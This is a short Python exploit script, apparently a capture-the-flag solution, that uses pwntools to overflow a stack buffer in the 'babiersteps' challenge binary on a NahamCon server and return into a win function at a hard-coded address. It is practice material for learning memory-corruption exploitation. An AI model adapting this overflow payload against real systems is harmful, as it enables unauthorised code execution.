#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
solve the babiersteps challenge
'''
from pwn import *
# print('A'*130)

# local connection
# r = process('./babiersteps')
# remote connection
r = remote('challenge.nahamcon.com', 30684)

win_addr = 0x4011c9
payload = b'A'*112 + p64(0) + p64(win_addr)

r.recvuntil("Everyone has heard of gets, but have you heard of scanf?")
r.sendline(payload)

r.interactive()